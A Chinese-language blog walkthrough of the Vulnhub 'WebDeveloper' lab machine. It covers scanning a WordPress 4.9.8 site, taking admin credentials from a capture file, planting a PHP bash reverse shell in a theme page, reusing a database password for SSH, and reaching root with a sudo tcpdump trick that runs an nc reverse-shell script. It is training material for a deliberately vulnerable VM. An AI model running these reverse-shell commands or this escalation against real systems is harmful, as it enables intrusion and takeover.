---
title: Vulnhub-WebDeveloper
date: 2024-03-17  
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Webdeveloper.html"
---

# WebDeveloper

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103354.png" alt="image-20240316114613262" style="zoom:50%;" />

这个靶场不知道为啥，下载忒慢了。。。。换了一个节点以后好多了！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103356.png" alt="image-20240316232155403" style="zoom:50%;" />

开始！

## 信息搜集

### 端口扫描

```bash
rustscan -a 192.168.37.129 -- -A -sV -sT
```

```text
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.37.129:22
Open 192.168.37.129:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 11:23 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:23
Completed NSE at 11:23, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:23
Completed NSE at 11:23, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:23
Completed NSE at 11:23, 0.00s elapsed
Initiating Ping Scan at 11:23
Scanning 192.168.37.129 [2 ports]
Completed Ping Scan at 11:23, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:23
Completed Parallel DNS resolution of 1 host. at 11:23, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:23
Scanning 192.168.37.129 [2 ports]
Discovered open port 22/tcp on 192.168.37.129
Discovered open port 80/tcp on 192.168.37.129
Completed Connect Scan at 11:23, 0.00s elapsed (2 total ports)
Initiating Service scan at 11:23
Scanning 2 services on 192.168.37.129
Completed Service scan at 11:23, 7.84s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.37.129.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:23
Completed NSE at 11:23, 1.10s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:23
Completed NSE at 11:23, 0.03s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:23
Completed NSE at 11:23, 0.00s elapsed
Nmap scan report for 192.168.37.129
Host is up, received syn-ack (0.00071s latency).
Scanned at 2024-03-16 11:23:03 EDT for 9s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:ac:73:4c:17:ec:6a:82:79:87:5a:f9:22:d4:12:cb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkgdNJs41OI0TFS67l3c9wTuvs/SD7S5kVwofnV5wkDIYa5grQc1J7C1qSImXlX2MQ02Y6VbcsebLpy4NqyAgtV+VBCEqWu6FujA2kwaWN+yL781GaEd3/Jze9a6Uxse4p5O6/5TtPeh5bVJTqFALQ9sjsZpwD528x9FfPdmK9voAKD3pzFWLBI4WaKqh2Xy+d3mDLQOc+dULhOymdiuGh+UcaSVQN9WSy9NeECWYxhy/pkpMGZS4DaVNGsHmQfQicjtaRhPYg8r2ICeAdgpZ2aQWpe1fcUW58t/uj3eauU3VRJNqiy+yp7hV+dwxrl9NqFKtmTlRvGvy3G8mLRyhJ
|   256 9c:d5:f3:2c:e2:d0:06:cc:8c:15:5a:5a:81:5b:03:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLrmTuklXg8ulgnCnC8YZZLKR9LbMSSW7QfxBsJUDjgBMVP6PsHYHlNaEY+oHfZtjU2L5VyQufGKoyvaS4CC30k=
|   256 ab:67:56:69:27:ea:3e:3b:33:73:32:f8:ff:2e:1f:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJddm5Qctin2VSmNmkU8zAOzC5y1+4W1u+4ygqepqjKi
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 4.9.8
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Example site &#8211; Just another WordPress site
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:23
Completed NSE at 11:23, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:23
Completed NSE at 11:23, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:23
Completed NSE at 11:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.01 seconds
```

### 目录扫描

```bash
feroxbuster -u http://192.168.37.129 -d 1 -x* -C 404
```

```text
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.37.129
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [*]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 1
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      322c http://192.168.37.129/wp-includes => http://192.168.37.129/wp-includes/
301      GET        9l       28w      321c http://192.168.37.129/wp-content => http://192.168.37.129/wp-content/
301      GET        9l       28w      319c http://192.168.37.129/wp-admin => http://192.168.37.129/wp-admin/
301      GET        9l       28w      317c http://192.168.37.129/ipdata => http://192.168.37.129/ipdata/
200      GET       43l       43w     1045c http://192.168.37.129/wp-includes/wlwmanifest.xml
200      GET        2l      281w    10056c http://192.168.37.129/wp-includes/js/jquery/jquery-migrate.min.js
200      GET      225l      400w     3646c http://192.168.37.129/wp-content/themes/twentyseventeen/assets/css/ie8.css
200      GET      209l      846w     5836c http://192.168.37.129/wp-content/themes/twentyseventeen/assets/js/jquery.scrollTo.js
200      GET      249l      928w     7682c http://192.168.37.129/wp-content/themes/twentyseventeen/assets/js/global.js
200      GET        1l        9w     1398c http://192.168.37.129/wp-includes/js/wp-embed.min.js
200      GET      369l     2389w   204846c http://192.168.37.129/wp-content/themes/twentyseventeen/assets/images/header.jpg
200      GET       31l       90w      683c http://192.168.37.129/wp-content/themes/twentyseventeen/assets/js/skip-link-focus-fix.js
500      GET        0l        0w        0c http://192.168.37.129/wp-content/themes/twentyseventeen/
200      GET      326l     1144w    10330c http://192.168.37.129/wp-content/themes/twentyseventeen/assets/js/html5.js
200      GET        6l     1435w    97184c http://192.168.37.129/wp-includes/js/jquery/jquery.js
200      GET     4327l     8642w    83401c http://192.168.37.129/wp-content/themes/twentyseventeen/style.css
301      GET        0l        0w        0c http://192.168.37.129/index.php/ => http://192.168.37.129/
405      GET        1l        6w       42c http://192.168.37.129/xmlrpc.php
200      GET        1l     2533w    52609c http://192.168.37.129/index.php/wp-json
200      GET       63l      173w     2160c http://192.168.37.129/wp-login.php
200      GET      319l     3642w    52813c http://192.168.37.129/
[####################] - 7s     30044/30044   0s      found:21      errors:0      
[####################] - 7s     30000/30000   4539/s  http://192.168.37.129/  
```

看出来明显是一个`wordpress`站，不过还是得小心。

### wapplayzer插件信息

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103357.png" alt="image-20240317000022561" style="zoom:50%;" />

## 漏洞利用

访问一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103358.png" alt="image-20240316234844071" style="zoom:50%;" />

查看一下有没有有意思的东西：

![image-20240316234932483](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103359.png)

登录页面！尝试万能密码梭一下，进不去，常见的弱密码也进不去。

尝试一下sql注入了，进不去啊，尝试使用`WPScan`扫描一下:

### 信息搜集

```bash
wpscan --url http://192.168.37.129
```

```text
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.37.129/ [192.168.37.129]
[+] Started: Sat Mar 16 11:56:41 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.37.129/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.37.129/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.37.129/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.37.129/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.8 identified (Insecure, released on 2018-08-02).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.37.129/index.php/feed/, <generator>https://wordpress.org/?v=4.9.8</generator>
 |  - http://192.168.37.129/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.9.8</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://192.168.37.129/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-01-16T00:00:00.000Z
 | Readme: http://192.168.37.129/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.5
 | Style URL: http://192.168.37.129/wp-content/themes/twentyseventeen/style.css?ver=4.9.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.37.129/wp-content/themes/twentyseventeen/style.css?ver=4.9.8, Match: 'Version: 1.7'
[+] Enumerating All Plugins (via Passive Methods)
[i] No plugins Found.
[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <======================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Mar 16 11:56:47 2024
[+] Requests Done: 171
[+] Cached Requests: 5
[+] Data Sent: 42.774 KB
[+] Data Received: 358.097 KB
[+] Memory used: 274.473 MB
[+] Elapsed time: 00:00:05
```

### 漏洞发掘

尝试找一下这个版本的漏洞：

```bash
searchsploit wordpress 4.9.8
```

![image-20240317000134837](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103360.png)

似乎没有利用起来比较方便的。

尝试找回密码：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103361.png" alt="image-20240317000218925" style="zoom:33%;" />

再找一下信息：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103362.png" alt="image-20240317000318236" style="zoom:33%;" />

重新看之前的信息搜集内容，发现一个奇怪的目录：

```bash
http://192.168.37.129/ipdata/
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103363.png" alt="image-20240317001101631" style="zoom:50%;" />

把这个数据流文件下载下来，追踪一下流量：

先是TCP流量，没啥东西：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103364.png" alt="image-20240317001348036" style="zoom:50%;" />

看一下其他的，最好可以找出登录信息，过滤字符串，看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103365.png" alt="image-20240317001919494" style="zoom:50%;" />

发现了用户名和密码，尝试进行登录。

```apl
webdeveloper
Te5eQg&4sBS!Yr$)wf%(DcAd
```

![image-20240317002146749](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103366.png)

进来了！！！啊~~

添加一个反向shell到它的404页面上！

```php
<?php exec ("bash -c 'exec bash -i &>/dev/tcp/10.161.181.188/1234 <&1'");?>
```

![image-20240317003204745](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103367.png)

访问：

```bash
wp-content/plugins/akismet/akismet.php
```

执行反弹shell！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103368.png" alt="image-20240317003321280" style="zoom:50%;" />

获取到了shell！！！！

## 提权

### 切换webdeveloper用户

本来想传一个公钥，ssh登录一下的，创建不了`.ssh`，查看一下相关信息：

```bash
www-data@webdeveloper:/home/webdeveloper$ whoami;id
whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@webdeveloper:/home/webdeveloper$ sudo -l
sudo -l
sudo: no tty present and no askpass program specified
www-data@webdeveloper:/home/webdeveloper$ find / -perm -u=s -type f 2>/dev/null
<webdeveloper$ find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount
/bin/ping
/snap/core/16928/bin/mount
/snap/core/16928/bin/ping
/snap/core/16928/bin/ping6
/snap/core/16928/bin/su
/snap/core/16928/bin/umount
/snap/core/16928/usr/bin/chfn
/snap/core/16928/usr/bin/chsh
/snap/core/16928/usr/bin/gpasswd
/snap/core/16928/usr/bin/newgrp
/snap/core/16928/usr/bin/passwd
/snap/core/16928/usr/bin/sudo
/snap/core/16928/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/16928/usr/lib/openssh/ssh-keysign
/snap/core/16928/usr/lib/snapd/snap-confine
/snap/core/16928/usr/sbin/pppd
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/at
/usr/bin/traceroute6.iputils
www-data@webdeveloper:/home/webdeveloper$ cat /etc/cron*
cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
cat: /etc/cron.weekly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
www-data@webdeveloper:/home/webdeveloper$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
webdeveloper:x:1000:1000:WebDeveloper:/home/webdeveloper:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
```

再看一下数据库文件吧：

```bash
cd /var/www/html
ls -la
cat wp-config.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103369.png" alt="image-20240317004031783" style="zoom:50%;" />

尝试能不能ssh进行登录。

```php
/** MySQL database username */
define('DB_USER', 'webdeveloper');

/** MySQL database password */
define('DB_PASSWORD', 'MasterOfTheUniverse');
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103370.png" alt="image-20240317004301553" style="zoom:50%;" />

登录成功了！

### 提权至root

尝试查看一下相关信息，信息搜集！！！

刚来就发现了好东西：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103371.png" alt="image-20240317004500368" style="zoom:50%;" />

我们可以尝试利用这个`tcpdump`，去查一下有无利用方式：

```url
https://gtfobins.github.io/gtfobins/tcpdump/
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103372.png" alt="image-20240317004646376" style="zoom: 33%;" />

查看一下`suid`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103373.png" alt="image-20240317004739910" style="zoom:50%;" />

尝试提权：

```bash
cd /tmp
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.161.181.188 1234 >/tmp/f" > exp
chmod +x exp
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exp -Z root
```

指令输入完以后退出`ssh`登录，就可以得到`root`了

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103374.png" alt="image-20240317010201589" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403170103375.png" alt="image-20240317010236203" style="zoom:50%;" />

拿到我们梦寐以求的flag了！

```flag
cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290
```

